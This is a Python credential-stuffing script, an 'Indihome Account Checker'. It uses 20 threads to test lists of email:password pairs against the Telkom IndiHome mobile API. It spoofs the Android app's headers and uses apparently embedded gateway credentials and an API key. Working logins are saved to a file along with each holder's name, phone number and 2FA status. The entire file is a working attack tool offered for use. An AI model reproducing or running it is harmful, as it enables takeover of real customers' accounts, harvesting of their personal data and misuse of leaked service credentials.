import os
try:
    import requests
except ImportError:
    os.system('pip install requests')
from time import sleep
try:
    from termcolor import colored
except ImportError:
    os.system('pip install termcolor')
from concurrent.futures import ThreadPoolExecutor

live = 0 ; block = 0 ; die = 0 ; unknown = 0

def checkUser(email, password):
	global live, block, die, unknown
	check = requests.get("https://apigw.telkom.co.id:7777/gateway/telkom-myihxmbe-account/1.0/user/userCheck?type=email&value="+ email, headers = {
		'Authorization': 'Basic bXlJbmRpaG9tZVg6Nkw3MUxPdWlubGloOWJuWkhBSUtKMjFIc3Qxcg==',
		'X-Gateway-APIKey': '070bb926-44d4-449e-9f88-b96c87392964',
		'Accept-Language': 'id',
		'x-device-type-id': 'ANDROID',
		'x-os-version': '12',
		'x-application-version': '4.1.9',
		'Host': 'apigw.telkom.co.id:7777',
		'Connection': 'Keep-Alive',
		'User-Agent': 'okhttp/3.14.7'
	}).text
	if 'User registered' in check:
		login = userLogin(email, password)
		if 'login successful' in login.text:
			nama = login.json()["data"]["userName"]
			lorofa = "YA" if login.json()["data"]["twoFactorAuth"] else "TIDAK"
			nomor = login.json()["data"]["mobile"] # rip sensor
			status = login.json()["data"]["status"]
			with open("[LIVE] Indihome.txt", "a") as file:
				file.write(f"{email}:{password} | Nama = {nama} | 2FA = {lorofa} | Nomor = {nomor} | Status = {status}\n")
				file.close()
			print(colored("[!] LIVE => " + email + ":" + password + " | Nama = " + nama + " | 2FA : " + lorofa + " | Nomor = " + nomor + " | Status = " + status, "green"))
			live += 1
		else:
			print(colored("[!] DIE => " + email + ":" + password, "red"))
			die += 1
	elif 'User is blocked.' in check:
		print(colored("[!] BLOCK => " + email, "yellow"))
		block += 1
	elif 'User not registered' or 'Error in migrated user data, Conflict in user data' in check:
		print(colored("[!] DIE => " + email, "red"))
		die += 1
	else:
		print(colored("[!] UNKNOWN => " + email, "cyan"))
		unknown += 1

def userLogin(email, password):
	return requests.post("https://apigw.telkom.co.id:7777/gateway/telkom-myihxmbe-identityserver/1.0/user/login", data = '{"email":"' + email + '","password":"' + password + '"}', headers = {
		'Authorization': 'Basic bXlJbmRpaG9tZVg6Nkw3MUxPdWlubGloOWJuWkhBSUtKMjFIc3Qxcg==',
		'X-Gateway-APIKey': '070bb926-44d4-449e-9f88-b96c87392964',
		'Accept-Language': 'id',
		'x-device-type-id': 'ANDROID',
		'x-os-version': '12',
		'x-application-version': '4.1.9',
		'Content-Type': 'application/json; charset=UTF-8',
		'Host': 'apigw.telkom.co.id:7777',
		'Connection': 'Keep-Alive',
		'User-Agent': 'okhttp/3.14.7'
	})

def main():
	os.system('cls' if os.name == 'nt' else 'clear')
	print(colored("""
 /$$   /$$                       /$$                         /$$   /$$ /$$       /$$          
| $$  | $$                      | $$                        | $$$ | $$| $$      | $$          
| $$  | $$ /$$   /$$ /$$$$$$$  /$$$$$$    /$$$$$$   /$$$$$$ | $$$$| $$| $$$$$$$ | $$ /$$$$$$$$
| $$$$$$$$| $$  | $$| $$__  $$|_  $$_/   /$$__  $$ /$$__  $$| $$ $$ $$| $$__  $$| $$|____ /$$/
| $$__  $$| $$  | $$| $$  \ $$  | $$    | $$$$$$$$| $$  \__/| $$  $$$$| $$  \ $$| $$   /$$$$/ 
| $$  | $$| $$  | $$| $$  | $$  | $$ /$$| $$_____/| $$      | $$\  $$$| $$  | $$| $$  /$$__/  
| $$  | $$|  $$$$$$/| $$  | $$  |  $$$$/|  $$$$$$$| $$      | $$ \  $$| $$$$$$$/| $$ /$$$$$$$$
|__/  |__/ \______/ |__/  |__/   \___/   \_______/|__/      |__/  \__/|_______/ |__/|________/
                                                                                              
                                                                                              
                               	Indihome Account Checker                                   	
""", 'green'))
	listEmpas = input("[?] List Empas > ")
	try:
		listEmpas = open(listEmpas)
	except FileNotFoundError:
		print(colored("[!] File "+ listEmpas +" Tidak Ada [!]", "red"))
		sleep(1)
		main()
	listEmpas.seek(0)
	delimiter = input("[?] Delimiter/Pemisah > ")
	print("-----------------------------------------------------------------------------------------------")
	with ThreadPoolExecutor(max_workers=20) as exe:
		for empas in listEmpas.readlines():
			empas = empas.strip().split(delimiter)
			if not empas or len(empas) != 2:
				continue
			email, password = empas
			exe.submit(checkUser, email, password)
	print("-----------------------------------------------------------------------------------------------")
	print("[!] Selesai [!]\n")
	print("[!] LIVE    : "+ str(live))
	print("[!] BLOCK   : "+ str(block))
	print("[!] DIE     : "+ str(die))
	print("[!] UNKNOWN : "+ str(unknown))
	print("-----------------------------------------------------------------------------------------------")
	
main()
